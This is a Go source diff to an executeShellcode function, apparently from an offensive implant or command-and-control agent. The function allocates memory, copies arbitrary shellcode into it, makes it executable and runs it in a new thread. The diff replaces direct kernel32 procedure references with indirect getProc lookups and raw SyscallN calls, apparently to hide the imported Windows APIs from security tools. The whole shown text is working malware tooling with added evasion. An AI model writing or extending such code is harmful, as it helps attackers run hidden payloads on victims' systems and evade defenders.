@@ -9,11 +9,6 @@ import (
 	"unsafe"
 )
 
-var (
-	pCreateThread  = kernel32.NewProc("CreateThread")
-	pWaitForSingle = kernel32.NewProc("WaitForSingleObject")
-)
-
 const (
 	INFINITE = 0xFFFFFFFF
 )
@@ -23,7 +18,8 @@ func executeShellcode(data []byte) string {
 		return "Error: empty shellcode"
 	}
 
-	addr, _, err := pVirtualAlloc.Call(
+	va := getProc(mKernel32, fVirtualAlloc)
+	addr, _, err := syscall.SyscallN(va,
 		0,
 		uintptr(len(data)),
 		MEM_COMMIT|MEM_RESERVE,
@@ -36,10 +32,11 @@ func executeShellcode(data []byte) string {
 	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data)), data)
 
 	var oldProtect uint32
-	pVirtualProtect.Call(addr, uintptr(len(data)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	syscall.SyscallN(rpVirtualProtect, addr, uintptr(len(data)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 
+	ct := getProc(mKernel32, fCreateThread)
 	var threadID uint32
-	thread, _, err := pCreateThread.Call(
+	thread, _, err := syscall.SyscallN(ct,
 		0,
 		0,
 		addr,
@@ -48,16 +45,19 @@ func executeShellcode(data []byte) string {
 		uintptr(unsafe.Pointer(&threadID)),
 	)
 	if thread == 0 {
-		pVirtualFree.Call(addr, 0, MEM_RELEASE)
+		vf := getProc(mKernel32, fVirtualFree)
+		syscall.SyscallN(vf, addr, 0, MEM_RELEASE)
 		return fmt.Sprintf("Error: CreateThread failed: %v", err)
 	}
 	defer syscall.CloseHandle(syscall.Handle(thread))
 
-	ret, _, _ := pWaitForSingle.Call(thread, uintptr(30*time.Second/time.Millisecond))
-	if ret == 0x00000102 { // WAIT_TIMEOUT
+	wfso := getProc(mKernel32, fWaitForSingleObject)
+	ret, _, _ := syscall.SyscallN(wfso, thread, uintptr(30*time.Second/time.Millisecond))
+	if ret == 0x00000102 {
 		return "Shellcode executing (thread still running after 30s)"
 	}
 
-	pVirtualFree.Call(addr, 0, MEM_RELEASE)
+	vf := getProc(mKernel32, fVirtualFree)
+	syscall.SyscallN(vf, addr, 0, MEM_RELEASE)
 	return fmt.Sprintf("Shellcode executed (%d bytes)", len(data))
 }
